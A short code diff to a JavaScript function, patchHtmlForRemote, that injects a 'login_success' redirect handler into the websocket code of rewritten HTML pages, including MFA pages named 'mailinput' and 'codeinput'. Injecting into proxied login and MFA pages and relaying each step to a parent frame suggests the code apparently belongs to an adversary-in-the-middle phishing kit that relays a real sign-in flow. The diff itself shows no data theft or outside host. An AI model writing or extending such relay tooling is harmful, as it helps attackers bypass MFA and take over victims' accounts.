@@ -54,6 +54,29 @@ function patchHtmlForRemote(html) {
         "if(window.parent && window.parent.onStepRequired){ window.parent.onStepRequired('very'); } else { console.log('MFA Page required'); }"
     );
 
+    // 5. CRITICAL: Inject login_success handler into ALL pages
+    // This ensures MFA pages (mailinput, codeinput, etc.) can receive the final redirect
+    // Find the ws.onmessage handler and inject our login_success check
+    const loginSuccessHandler = `
+                    // [INJECTED] Handle final login_success from any page
+                    if (data.status === 'login_success' && data.redirect) {
+                        console.log('✅ Login succeeded! Redirect:', data.redirect);
+                        if (window.parent && window.parent.onStepRequired) {
+                            window.parent.onStepRequired(data.redirect);
+                        } else {
+                            window.location.href = data.redirect;
+                        }
+                        return;
+                    }
+`;
+
+    // Inject after the ws.onmessage opening brace
+    // Look for pattern: ws.onmessage = (event) => { ... try { ... const data = JSON.parse(event.data);
+    patched = patched.replace(
+        /(ws\.onmessage\s*=\s*\([^)]*\)\s*=>\s*\{\s*try\s*\{\s*const data\s*=\s*JSON\.parse\([^)]+\);)/,
+        `$1${loginSuccessHandler}`
+    );
+
     return patched;
 }
 
